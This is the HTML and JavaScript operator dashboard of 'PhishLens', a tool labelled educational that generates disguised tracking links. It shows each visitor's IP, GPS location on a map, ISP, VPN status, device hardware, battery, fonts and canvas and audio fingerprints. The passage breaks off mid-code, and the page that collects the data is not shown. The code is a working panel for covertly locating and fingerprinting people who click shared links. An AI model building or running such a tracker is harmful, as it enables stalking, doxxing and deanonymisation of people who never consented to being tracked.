<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>PhishLens ‚Äî URL Tracker</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #0a0a0a;
      --bg2: #111;
      --bg3: #161616;
      --surface: rgba(255,255,255,0.04);
      --surface2: rgba(255,255,255,0.07);
      --surface3: rgba(255,255,255,0.12);
      --border: rgba(255,255,255,0.08);
      --border2: rgba(255,255,255,0.14);
      --text: #f0f0f0;
      --text2: #888;
      --text3: #444;
      --green: #44ff88;
      --blue: #4488ff;
      --amber: #ffcc44;
      --red: #ff4455;
      --sidebar-w: 280px;
      --detail-w: 390px;
      --radius: 16px;
      --radius-sm: 10px;
    }
    *{box-sizing:border-box;margin:0;padding:0}
    html,body{height:100%;background:var(--bg);color:var(--text);font-family:'DM Sans',sans-serif;overflow:hidden;-webkit-font-smoothing:antialiased}
    body::before{content:'';position:fixed;inset:0;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.035'/%3E%3C/svg%3E");pointer-events:none;z-index:9999;opacity:.5}

    .app{display:flex;height:100vh;width:100vw;overflow:hidden}

    /* ‚îÄ‚îÄ Sidebar ‚îÄ‚îÄ */
    .sidebar{width:var(--sidebar-w);min-width:var(--sidebar-w);height:100vh;display:flex;flex-direction:column;background:rgba(12,12,12,0.97);border-right:1px solid var(--border);position:relative;z-index:10}
    .sidebar-header{padding:22px 18px 14px;border-bottom:1px solid var(--border)}
    .logo{display:flex;align-items:center;gap:10px;margin-bottom:2px}
    .logo-icon{width:34px;height:34px;background:#fff;border-radius:9px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
    .logo-icon svg{width:18px;height:18px}
    .logo-name{font-family:'Space Mono',monospace;font-size:14px;font-weight:700;letter-spacing:-.3px}
    .logo-sub{font-size:10px;color:var(--text3);font-family:'Space Mono',monospace;letter-spacing:.5px;margin-left:44px;margin-top:-2px}
    .section-label{padding:14px 18px 5px;font-size:10px;font-weight:600;color:var(--text3);letter-spacing:1.5px;text-transform:uppercase;font-family:'Space Mono',monospace}
    .links-list{flex:1;overflow-y:auto;padding:4px 8px}
    .links-list::-webkit-scrollbar{width:2px}
    .links-list::-webkit-scrollbar-thumb{background:var(--border2);border-radius:99px}

    .link-item{display:flex;align-items:center;gap:9px;padding:9px 10px;border-radius:var(--radius-sm);cursor:pointer;transition:background .15s;margin-bottom:2px;animation:fadeUp .2s ease}
    .link-item:hover{background:var(--surface2)}
    .link-item.active{background:var(--surface3)}
    .link-dot{width:7px;height:7px;border-radius:50%;background:var(--text3);flex-shrink:0;transition:all .3s}
    .link-item.has-visits .link-dot{background:var(--green);box-shadow:0 0 8px rgba(68,255,136,.5)}
    .link-info{flex:1;min-width:0}
    .link-id{font-family:'Space Mono',monospace;font-size:11.5px;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
    .link-meta{font-size:10px;color:var(--text3);margin-top:1px}
    .link-badge{font-size:10px;font-family:'Space Mono',monospace;background:var(--surface2);color:var(--text2);padding:2px 7px;border-radius:99px;border:1px solid var(--border);flex-shrink:0}
    .link-item.has-visits .link-badge{background:rgba(68,255,136,.1);color:var(--green);border-color:rgba(68,255,136,.2)}

    .sidebar-footer{padding:14px;border-top:1px solid var(--border)}
    .btn-gen{width:100%;padding:12px;background:#fff;color:#000;border:none;border-radius:var(--radius-sm);font-family:'Space Mono',monospace;font-size:11.5px;font-weight:700;letter-spacing:.3px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:7px;transition:all .2s}
    .btn-gen:hover{background:#e8e8e8;transform:translateY(-1px);box-shadow:0 8px 24px rgba(255,255,255,.1)}
    .btn-gen:active{transform:translateY(0)}
    .btn-gen svg{width:13px;height:13px}

    /* ‚îÄ‚îÄ Main ‚îÄ‚îÄ */
    .main{flex:1;display:flex;flex-direction:column;overflow:hidden;background:var(--bg)}
    .main-header{padding:18px 26px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:rgba(10,10,10,.9);backdrop-filter:blur(20px)}
    .main-title{font-size:12px;color:var(--text2);font-family:'Space Mono',monospace}
    .main-title span{color:var(--text)}
    .status-pill{display:flex;align-items:center;gap:6px;padding:4px 11px;background:var(--surface);border:1px solid var(--border);border-radius:99px;font-size:10px;color:var(--text3);font-family:'Space Mono',monospace}
    .status-dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 6px rgba(68,255,136,.6);animation:pulse 2s infinite}
    @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
    .main-content{flex:1;overflow-y:auto;padding:26px}
    .main-content::-webkit-scrollbar{width:2px}
    .main-content::-webkit-scrollbar-thumb{background:var(--border2);border-radius:99px}

    .empty-state{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;text-align:center;gap:10px;color:var(--text3)}
    .empty-icon{width:60px;height:60px;background:var(--surface);border:1px solid var(--border);border-radius:18px;display:flex;align-items:center;justify-content:center;margin-bottom:6px}
    .empty-icon svg{width:26px;height:26px;opacity:.3}
    .empty-title{font-size:14px;color:var(--text2);font-weight:500}
    .empty-sub{font-size:12px;max-width:200px;line-height:1.6}

    /* ‚îÄ‚îÄ Detail Panel ‚îÄ‚îÄ */
    .detail-panel{width:var(--detail-w);min-width:var(--detail-w);height:100vh;background:rgba(11,11,11,.98);border-left:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden;transform:translateX(100%);transition:transform .3s cubic-bezier(.25,.46,.45,.94)}
    .detail-panel.open{transform:translateX(0)}
    .detail-header{padding:18px 18px 14px;border-bottom:1px solid var(--border)}
    .detail-close{width:26px;height:26px;background:var(--surface2);border:1px solid var(--border);border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;margin-bottom:12px;transition:background .15s;flex-shrink:0}
    .detail-close:hover{background:var(--surface3)}
    .detail-close svg{width:11px;height:11px}
    .detail-url-label{font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:1.2px;font-family:'Space Mono',monospace;margin-bottom:5px}
    .detail-url-box{font-family:'Space Mono',monospace;font-size:10.5px;color:var(--text2);word-break:break-all;line-height:1.5;padding:9px 10px;background:var(--surface);border-radius:8px;border:1px solid var(--border);display:flex;align-items:flex-start;gap:7px}
    .detail-url-box span{flex:1}
    .copy-btn{width:26px;height:26px;min-width:26px;background:var(--surface2);border:1px solid var(--border2);border-radius:6px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all .15s;flex-shrink:0}
    .copy-btn:hover{background:#fff;border-color:#fff}
    .copy-btn:hover svg{color:#000}
    .copy-btn.copied{background:rgba(68,255,136,.15);border-color:rgba(68,255,136,.3)}
    .copy-btn svg{width:12px;height:12px;color:var(--text2);transition:color .15s}

    .detail-stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:7px;padding:12px 18px;border-bottom:1px solid var(--border)}
    .stat-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-sm);padding:10px 11px}
    .stat-label{font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:1px;font-family:'Space Mono',monospace;margin-bottom:3px}
    .stat-value{font-size:18px;font-family:'Space Mono',monospace;font-weight:700;color:var(--text)}
    .stat-sub{font-size:9px;color:var(--text3);margin-top:1px}

    .visits-label{padding:11px 18px 6px;font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:1.2px;font-family:'Space Mono',monospace;border-bottom:1px solid var(--border)}
    .visits-list{flex:1;overflow-y:auto;padding:6px 8px}
    .visits-list::-webkit-scrollbar{width:2px}
    .visits-list::-webkit-scrollbar-thumb{background:var(--border2);border-radius:99px}

    .visit-item{padding:10px 11px;border-radius:var(--radius-sm);cursor:pointer;transition:background .15s;margin-bottom:3px;border:1px solid transparent;animation:fadeUp .15s ease}
    .visit-item:hover{background:var(--surface2);border-color:var(--border)}
    .visit-item.active{background:var(--surface3);border-color:var(--border2)}
    .visit-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:5px}
    .visit-ip{font-family:'Space Mono',monospace;font-size:11.5px;color:var(--text);display:flex;align-items:center;gap:5px}
    .visit-gps-icon{font-size:9px;color:var(--green);background:rgba(68,255,136,.1);padding:1px 5px;border-radius:99px;border:1px solid rgba(68,255,136,.2)}
    .visit-time{font-size:9px;color:var(--text3);font-family:'Space Mono',monospace}
    .visit-tags{display:flex;gap:4px;flex-wrap:wrap}
    .vtag{font-size:9px;padding:2px 6px;border-radius:99px;background:var(--surface2);border:1px solid var(--border);color:var(--text2);font-family:'Space Mono',monospace}
    .vtag.gps{background:rgba(68,255,136,.07);color:var(--green);border-color:rgba(68,255,136,.15)}
    .vtag.geo{background:rgba(68,136,255,.07);color:var(--blue);border-color:rgba(68,136,255,.15)}
    .no-visits{padding:28px 18px;text-align:center;color:var(--text3);font-size:11px;font-family:'Space Mono',monospace;line-height:1.8}

    /* ‚îÄ‚îÄ Modal ‚îÄ‚îÄ */
    .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(10px);z-index:100;display:flex;align-items:center;justify-content:center;opacity:0;pointer-events:none;transition:opacity .2s}
    .modal-overlay.open{opacity:1;pointer-events:all}
    .modal{width:580px;max-width:96vw;max-height:88vh;background:#0f0f0f;border:1px solid var(--border2);border-radius:20px;overflow:hidden;display:flex;flex-direction:column;box-shadow:0 40px 80px rgba(0,0,0,.7);transform:scale(.94) translateY(12px);transition:transform .22s cubic-bezier(.25,.46,.45,.94)}
    .modal-overlay.open .modal{transform:scale(1) translateY(0)}
    .modal-header{padding:18px 22px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
    .modal-title{font-size:13px;font-weight:600;display:flex;align-items:center;gap:8px}
    .mtdot{width:8px;height:8px;background:var(--green);border-radius:50%;box-shadow:0 0 8px rgba(68,255,136,.6)}
    .modal-ip{font-family:'Space Mono',monospace;font-size:12px;color:var(--text2)}
    .modal-close{width:27px;height:27px;background:var(--surface2);border:1px solid var(--border);border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:background .15s}
    .modal-close:hover{background:var(--surface3)}
    .modal-close svg{width:11px;height:11px}
    .modal-body{flex:1;overflow-y:auto;padding:18px 22px}
    .modal-body::-webkit-scrollbar{width:2px}
    .modal-body::-webkit-scrollbar-thumb{background:var(--border2);border-radius:99px}

    /* GPS Map */
    .gps-map-container{margin-bottom:18px;border-radius:12px;overflow:hidden;border:1px solid var(--border2)}
    .gps-map-header{padding:9px 14px;background:rgba(68,255,136,.06);border-bottom:1px solid rgba(68,255,136,.12);display:flex;align-items:center;justify-content:space-between}
    .gps-map-title{font-size:10px;font-family:'Space Mono',monospace;color:var(--green);display:flex;align-items:center;gap:6px}
    .gps-coords{font-size:10px;font-family:'Space Mono',monospace;color:rgba(68,255,136,.6)}
    .gps-map-frame{width:100%;height:200px;background:var(--bg3);display:block;border:none}
    .gps-accuracy{padding:6px 14px;background:rgba(68,255,136,.03);font-size:10px;font-family:'Space Mono',monospace;color:var(--text3)}
    .gps-map-link{padding:8px 14px;background:rgba(68,255,136,.04);border-top:1px solid rgba(68,255,136,.1);font-size:11px;font-family:'Space Mono',monospace;color:var(--green);text-decoration:none;display:block;text-align:center}
    .gps-map-link:hover{background:rgba(68,255,136,.08)}

    /* Geo banner */
    .geo-banner{margin-bottom:16px;padding:12px 14px;background:rgba(68,136,255,.05);border:1px solid rgba(68,136,255,.12);border-radius:10px;display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
    .geo-item{}
    .geo-key{font-size:9px;color:var(--text3);font-family:'Space Mono',monospace;text-transform:uppercase;letter-spacing:.8px;margin-bottom:3px}
    .geo-val{font-size:12px;font-family:'Space Mono',monospace;color:var(--blue)}

    .info-section{margin-bottom:16px}
    .section-title{font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:1.5px;font-family:'Space Mono',monospace;margin-bottom:8px;padding-bottom:5px;border-bottom:1px solid var(--border)}
    .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px}
    .irow{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:9px 11px}
    .irow.full{grid-column:1/-1}
    .irow.full3{grid-column:1/-1}
    .ikey{font-size:9px;color:var(--text3);font-family:'Space Mono',monospace;margin-bottom:3px;text-transform:uppercase;letter-spacing:.7px}
    .ival{font-size:11px;color:var(--text);font-family:'Space Mono',monospace;word-break:break-all;line-height:1.4}
    .ival.green{color:var(--green)}
    .ival.blue{color:var(--blue)}
    .ival.amber{color:var(--amber)}
    .ival.red{color:var(--red)}
    .ival.dim{color:var(--text3)}

    /* Fingerprint bar */
    .fp-bar{display:flex;align-items:center;gap:8px;margin-bottom:6px}
    .fp-hash{font-family:'Space Mono',monospace;font-size:11px;color:var(--amber);background:rgba(255,204,68,.07);border:1px solid rgba(255,204,68,.15);padding:5px 10px;border-radius:6px;flex:1;word-break:break-all}
    .fp-label{font-size:9px;color:var(--text3);font-family:'Space Mono',monospace;flex-shrink:0}

    /* Toast */
    .toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%) translateY(80px);background:rgba(22,22,22,.97);border:1px solid var(--border2);color:var(--text);padding:9px 18px;border-radius:99px;font-size:12px;font-family:'Space Mono',monospace;backdrop-filter:blur(20px);z-index:9999;transition:transform .3s cubic-bezier(.25,.46,.45,.94);pointer-events:none}
    .toast.show{transform:translateX(-50%) translateY(0)}

    /* Loading spinner in visit */
    .collecting-badge{font-size:9px;font-family:'Space Mono',monospace;color:var(--amber);background:rgba(255,204,68,.08);border:1px solid rgba(255,204,68,.15);padding:2px 7px;border-radius:99px;animation:pulse 1.5s infinite}

    @keyframes fadeUp{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}
    @keyframes spin{to{transform:rotate(360deg)}}
  </style>
</head>
<body>
<div class="app">

  <!-- Sidebar -->
  <aside class="sidebar">
    <div class="sidebar-header">
      <div class="logo">
        <div class="logo-icon">
          <svg viewBox="0 0 20 20" fill="none" stroke="black" stroke-width="2.2">
            <circle cx="10" cy="10" r="8"/>
            <path d="M2 10h16M10 2a12 12 0 0 1 0 16M10 2a12 12 0 0 0 0 16"/>
          </svg>
        </div>
        <div class="logo-name">PhishLens</div>
      </div>
      <div class="logo-sub">URL Tracker ¬∑ Educational</div>
    </div>
    <div class="section-label">Fake Links</div>
    <div class="links-list" id="linksList">
      <div style="padding:20px 10px;text-align:center;color:var(--text3);font-size:10px;font-family:'Space Mono',monospace;line-height:1.8">No links yet.<br>Generate one below.</div>
    </div>
    <div class="sidebar-footer">
      <button class="btn-gen" onclick="generateLink()">
        <svg viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M10 4v12M4 10h12"/></svg>
        Generate Fake URL
      </button>
    </div>
  </aside>

  <!-- Main -->
  <main class="main">
    <div class="main-header">
      <div class="main-title" id="mainTitle">Select a link</div>
      <div class="status-pill"><div class="status-dot"></div>LIVE</div>
    </div>
    <div class="main-content">
      <div class="empty-state">
        <div class="empty-icon">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
            <path d="M13.828 10.172a4 4 0 0 0-5.656 0l-4 4a4 4 0 1 0 5.656 5.656l1.102-1.101"/>
            <path d="m10.172 13.828 a4 4 0 0 0 5.656 0l4-4a4 4 0 0 0-5.656-5.656l-1.102 1.101"/>
          </svg>
        </div>
        <div class="empty-title">No link selected</div>
        <div class="empty-sub">Generate a fake URL and select it to inspect visitors</div>
      </div>
    </div>
  </main>

  <!-- Detail Panel -->
  <aside class="detail-panel" id="detailPanel">
    <div class="detail-header">
      <div style="display:flex;align-items:center;justify-content:space-between">
        <div class="detail-close" onclick="closeDetail()">
          <svg viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M1 1l10 10M11 1L1 11"/></svg>
        </div>
        <div style="font-size:9px;color:var(--text3);font-family:'Space Mono',monospace" id="detailRefresh">‚ü≥ auto-refresh 3s</div>
      </div>
      <div class="detail-url-label">Fake URL</div>
      <div class="detail-url-box">
        <span id="detailUrl"></span>
        <div class="copy-btn" id="copyBtn" onclick="copyUrl()">
          <svg viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="8" y="8" width="10" height="10" rx="2"/><path d="M4 12H3a1 1 0 0 1-1-1V3a1 1 0 0 1 1-1h8a1 1 0 0 1 1 1v1"/></svg>
        </div>
      </div>
    </div>

    <div class="detail-stats">
      <div class="stat-card">
        <div class="stat-label">Visits</div>
        <div class="stat-value" id="statVisits">0</div>
        <div class="stat-sub">total</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">GPS</div>
        <div class="stat-value" id="statGPS">0</div>
        <div class="stat-sub">with coords</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Created</div>
        <div class="stat-value" id="statTime" style="font-size:13px;margin-top:3px">‚Äî</div>
        <div class="stat-sub" id="statDate"></div>
      </div>
    </div>

    <div class="visits-label">Visitors</div>
    <div class="visits-list" id="visitsList">
      <div class="no-visits">No visitors yet.<br>Share the URL to track.</div>
    </div>
  </aside>
</div>

<!-- Modal -->
<div class="modal-overlay" id="modalOverlay" onclick="closeModalClick(event)">
  <div class="modal">
    <div class="modal-header">
      <div class="modal-title">
        <div class="mtdot"></div>
        Visitor Details
        <span class="modal-ip" id="modalIp"></span>
      </div>
      <div class="modal-close" onclick="closeModal()">
        <svg viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M1 1l10 10M11 1L1 11"/></svg>
      </div>
    </div>
    <div class="modal-body" id="modalBody"></div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
let links = {};
let selectedId = null;
let pollTimer = null;

// ‚îÄ‚îÄ Utils
const $ = id => document.getElementById(id);
function toast(msg) {
  const t = $('toast');
  t.textContent = msg;
  t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 2400);
}
function ago(iso) {
  const s = Math.floor((Date.now() - new Date(iso)) / 1000);
  if (s < 60) return s + 's ago';
  if (s < 3600) return Math.floor(s/60) + 'm ago';
  if (s < 86400) return Math.floor(s/3600) + 'h ago';
  return Math.floor(s/86400) + 'd ago';
}
function fmt(iso) { return new Date(iso).toLocaleTimeString('uk-UA',{hour:'2-digit',minute:'2-digit',second:'2-digit'}); }
function fmtDate(iso) { return new Date(iso).toLocaleDateString('uk-UA',{day:'2-digit',month:'short'}); }
function esc(s) { return String(s||'').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function val(v, cls='') { return `<span class="ival ${cls}">${esc(v)||'‚Äî'}</span>`; }

// ‚îÄ‚îÄ Generate
async function generateLink() {
  try {
    const r = await fetch('/api/links', { method:'POST', headers:{'Content-Type':'application/json'} });
    const d = await r.json();
    if (d.success) {
      links[d.link.id] = d.link;
      renderSidebar();
      selectLink(d.link.id);
      toast('‚úì Fake URL generated');
    }
  } catch(e) { toast('Error'); }
}

// ‚îÄ‚îÄ Sidebar
function renderSidebar() {
  const list = $('linksList');
  const sorted = Object.values(links).sort((a,b) => new Date(b.created) - new Date(a.created));
  if (!sorted.length) {
    list.innerHTML = `<div style="padding:20px 10px;text-align:center;color:var(--text3);font-size:10px;font-family:'Space Mono',monospace;line-height:1.8">No links yet.<br>Generate one below.</div>`;
    return;
  }
  list.innerHTML = sorted.map(l => {
    const gpsCount = (l.clicks||[]).filter(c => c.client?.gps).length;
    return `<div class="link-item ${(l.clicks||[]).length?'has-visits':''} ${selectedId===l.id?'active':''}" onclick="selectLink('${l.id}')">
      <div class="link-dot"></div>
      <div class="link-info">
        <div class="link-id">${l.id}</div>
        <div class="link-meta">${ago(l.created)}${gpsCount?' ¬∑ üìç'+gpsCount:''}</div>
      </div>
      <div class="link-badge">${(l.clicks||[]).length}</div>
    </div>`;
  }).join('');
}

// ‚îÄ‚îÄ Select
async function selectLink(id) {
  selectedId = id;
  renderSidebar();
  const r = await fetch(`/api/links/${id}`);
  const link = await r.json();
  links[id] = link;
  $('detailPanel').classList.add('open');
  $('detailUrl').textContent = link.url;
  updateStats(link);
  renderVisits(link.clicks||[]);
  clearInterval(pollTimer);
  pollTimer = setInterval(() => pollLink(id), 3000);
}

function updateStats(link) {
  const clicks = link.clicks||[];
  $('statVisits').textContent = clicks.length;
  $('statGPS').textContent = clicks.filter(c => c.client?.gps).length;
  $('statTime').textContent = fmt(link.created);
  $('statDate').textContent = fmtDate(link.created);
}

async function pollLink(id) {
  try {
    const r = await fetch(`/api/links/${id}`);
    const link = await r.json();
    const prev = links[id]?.clicks?.length||0;
    links[id] = link;
    const curr = link.clicks.length;
    if (curr > prev) {
      toast(`üéØ New visitor! (${curr} total)`);
      updateStats(link);
      renderVisits(link.clicks);
      renderSidebar();
    } else {
      // Update existing if client data arrived
      updateStats(link);
      renderVisits(link.clicks);
      renderSidebar();
    }
  } catch(e) {}
}

function renderVisits(clicks) {
  const list = $('visitsList');
  if (!clicks.length) {
    list.innerHTML = `<div class="no-visits">No visitors yet.<br>Share the URL to track.</div>`;
    return;
  }
  list.innerHTML = [...clicks].reverse().map(c => {
    const cl = c.client;
    const hasGPS = cl?.gps;
    const geo = c.geo;
    const isCollecting = !cl;
    return `<div class="visit-item" onclick="showVisit('${selectedId}','${c.id}')">
      <div class="visit-top">
        <span class="visit-ip">
          ${esc(c.ip)}
          ${hasGPS ? '<span class="visit-gps-icon">üìç GPS</span>' : ''}
          ${isCollecting ? '<span class="collecting-badge">collecting...</span>' : ''}
        </span>
        <span class="visit-time">${fmt(c.timestamp)}</span>
      </div>
      <div class="visit-tags">
        <span class="vtag">${esc(c.browser)}</span>
        <span class="vtag">${esc(c.os)}</span>
        <span class="vtag">${esc(c.device)}</span>
        ${geo ? `<span class="vtag geo">${esc(geo.city)}, ${esc(geo.countryCode)}</span>` : ''}
        ${cl?.darkMode ? '<span class="vtag">üåô</span>' : ''}
        ${cl?.adBlocker ? '<span class="vtag">üõ°Ô∏è AdBlock</span>' : ''}
      </div>
    </div>`;
  }).join('');
}

function closeDetail() {
  $('detailPanel').classList.remove('open');
  selectedId = null;
  clearInterval(pollTimer);
  renderSidebar();
}

// ‚îÄ‚îÄ Copy
async function copyUrl() {
  await navigator.clipboard.writeText($('detailUrl').textContent);
  $('copyBtn').classList.add('copied');
  toast('‚úì URL copied!');
  setTimeout(() => $('copyBtn').classList.remove('copied'), 2000);
}

// ‚îÄ‚îÄ Modal
function showVisit(linkId, clickId) {
  const link = links[linkId];
  if (!link) return;
  const c = link.clicks.find(x => x.id === clickId);
  if (!c) return;
  const cl = c.client || {};
  const geo = c.geo || {};

  $('modalIp').textContent = c.ip;

  let html = '';

  // GPS Map
  if (cl.gps) {
    const {lat, lon, accuracy, altitude, speed} = cl.gps;
    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
    const osmUrl = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=15`;
    html += `<div class="gps-map-container">
      <div class="gps-map-header">
        <div class="gps-map-title">üìç GPS Location</div>
        <div class="gps-coords">${lat.toFixed(5)}, ${lon.toFixed(5)}</div>
      </div>
      <iframe class="gps-map-frame"
        src="https://www.openstreetmap.org/export/embed.html?bbox=${lon-.01},${lat-.01},${lon+.01},${lat+.01}&layer=mapnik&marker=${lat},${lon}"
        loading="lazy" allowfullscreen></iframe>
      <div class="gps-accuracy">Accuracy: ¬±${accuracy ? Math.round(accuracy) + 'm' : 'N/A'} ¬∑ Altitude: ${altitude ? Math.round(altitude)+'m' : 'N/A'} ¬∑ Speed: ${speed != null ? speed + ' m/s' : 'N/A'}</div>
      <a class="gps-map-link" href="${mapsUrl}" target="_blank">Open in Google Maps ‚Üó</a>
    </div>`;
  }

  // IP Geo
  if (geo.status === 'success') {
    html += `<div class="geo-banner">
      <div class="geo-item"><div class="geo-key">City</div><div class="geo-val">${esc(geo.city)||'‚Äî'}</div></div>
      <div class="geo-item"><div class="geo-key">Region</div><div class="geo-val">${esc(geo.regionName)||'‚Äî'}</div></div>
      <div class="geo-item"><div class="geo-key">Country</div><div class="geo-val">${esc(geo.country)||'‚Äî'}</div></div>
      <div class="geo-item"><div class="geo-key">ISP</div><div class="geo-val">${esc(geo.isp)||'‚Äî'}</div></div>
      <div class="geo-item"><div class="geo-key">Org</div><div class="geo-val">${esc(geo.org)||'‚Äî'}</div></div>
      <div class="geo-item"><div class="geo-key">IP Coords</div><div class="geo-val">${geo.lat?.toFixed(3)}, ${geo.lon?.toFixed(3)}</div></div>
    </div>
    ${geo.proxy || geo.hosting ? `<div style="margin-bottom:14px;padding:8px 12px;background:rgba(255,68,85,.06);border:1px solid rgba(255,68,85,.15);border-radius:8px;font-size:10px;font-family:'Space Mono',monospace;color:var(--red)">
      ‚ö† ${geo.proxy?'VPN/Proxy detected ':''} ${geo.mobile?'Mobile network ':''} ${geo.hosting?'Hosting/Datacenter IP':''}
    </div>` : ''}`;
  }

  // Network & Connection
  html += section('Network', `
    ${row('IP Address', c.ip, 'green')}
    ${row('ISP', geo.isp)}
    ${row('ASN', geo.as)}
    ${row('Postal Code', geo.zip)}
    ${row('VPN/Proxy', geo.proxy ? '‚ö† YES' : 'No', geo.proxy ? 'red' : 'dim')}
    ${row('Hosting IP', geo.hosting ? '‚ö† YES' : 'No', geo.hosting ? 'amber' : 'dim')}
    ${row('Mobile Net', geo.mobile ? 'Yes' : 'No')}
    ${row('Connection', cl.connectionType)}
    ${row('Downlink', cl.downlink)}
    ${row('RTT', cl.rtt)}
    ${row('Save Data', cl.saveData ? 'ON' : 'Off')}
    ${row('Online', cl.onLine !== undefined ? (cl.onLine ? 'Yes' : 'No') : '‚Äî')}
  `);

  // Browser
  html += section('Browser & System', `
    ${row('Browser', c.browser + (c.browserVersion && c.browserVersion !== 'N/A' ? ' ' + c.browserVersion : ''), 'blue')}
    ${row('Engine', c.renderingEngine)}
    ${row('OS', c.os + (c.osVersion && c.osVersion !== 'N/A' ? ' ' + c.osVersion : ''))}
    ${row('Device', c.device)}
    ${row('Device Info', c.deviceModel)}
    ${row('Platform', cl.platform || c.platform || '‚Äî')}
    ${row('Vendor', cl.vendor)}
    ${row('Cookies', cl.cookiesEnabled ? 'Enabled' : 'Disabled')}
    ${row('DNT', cl.doNotTrack||c.dnt||'Not set')}
    ${row('PDF Viewer', cl.pdfViewerEnabled ? 'Yes' : 'No')}
    ${row('ServiceWorker', cl.serviceWorker ? 'Yes' : 'No')}
    ${row('WebGL', cl.webGL ? 'Yes' : 'No')}
    ${row('Plugins', cl.plugins, 'dim')}
  `);

  // Display
  html += section('Display', `
    ${row('Screen', cl.screen)}
    ${row('Avail Screen', cl.availScreen)}
    ${row('Window Size', cl.innerWindow)}
    ${row('Pixel Ratio', cl.pixelRatio ? cl.pixelRatio + 'x' : '‚Äî')}
    ${row('Color Depth', cl.colorDepth ? cl.colorDepth + ' bit' : '‚Äî')}
    ${row('Orientation', cl.orientation)}
    ${row('Dark Mode', cl.darkMode ? 'üåô Yes' : '‚òÄÔ∏è No')}
    ${row('Reduced Motion', cl.reducedMotion ? 'Yes' : 'No')}
  `);

  // Hardware
  html += section('Hardware', `
    ${row('CPU Cores', cl.cores)}
    ${row('RAM', cl.memory ? cl.memory + ' GB' : '‚Äî')}
    ${row('Touch Points', cl.touchPoints !== undefined ? cl.touchPoints : '‚Äî')}
    ${row('Cameras', cl.cameras !== undefined ? cl.cameras : '‚Äî')}
    ${row('Microphones', cl.microphones !== undefined ? cl.microphones : '‚Äî')}
    ${row('WebGL Vendor', cl.webglVendor, 'dim')}
    ${row('GPU Renderer', cl.webglRenderer, 'dim')}
  `);

  // Battery
  if (cl.battery && Object.keys(cl.battery).length) {
    html += section('Battery', `
      ${row('Level', cl.battery.level)}
      ${row('Charging', cl.battery.charging ? '‚ö° Yes' : 'No')}
      ${row('Charge Time', cl.battery.chargingTime)}
      ${row('Discharge Time', cl.battery.dischargingTime)}
    `);
  }

  // Storage & Locale
  html += section('Storage & Locale', `
    ${row('Storage Used', cl.storageUsed)}
    ${row('Storage Quota', cl.storageTotal)}
    ${row('Timezone', cl.timezone || '‚Äî', 'green')}
    ${row('UTC Offset', cl.timezoneOffset !== undefined ? (cl.timezoneOffset > 0 ? '-' : '+') + Math.abs(cl.timezoneOffset/60) + 'h' : '‚Äî')}
    ${row('Languages', cl.languages || c.acceptLanguage)}
    ${row('Ad Blocker', cl.adBlocker ? 'üõ°Ô∏è YES' : 'No', cl.adBlocker ? 'amber' : '')}
    ${row('History Length', cl.historyLength)}
    ${row('Fonts Found', cl.fontsCount ? cl.fontsCount + ' fonts' : '‚Äî')}
    ${rowFull('Available Fonts', cl.availableFonts)}
  `);

  // Fingerprints
  html += `<div class="info-section">
    <div class="section-title">Fingerprints</div>
    <div style="margin-bottom:8px">
      <div class="ikey" style="margin-bottom:5px">Canvas Fingerprint</div>
      <div class="fp-bar"><div class="fp-hash">${esc(cl.canvasHash||'N/A')}</div></div>
    </div>
    <div style="margin-bottom:8px">
      <div class="ikey" style="margin-bottom:5px">Audio Fingerprint</div>
      <div class="fp-bar"><div class="fp-hash">${esc(cl.audioHash||'N/A')}</div></div>
    </div>
  </div>`;

  // Request headers
  html += section('Request Info', `
    ${row('Visited', new Date(c.timestamp).toLocaleString('uk-UA'))}
    ${row('Referrer', cl.referrer||c.referer||'Direct')}
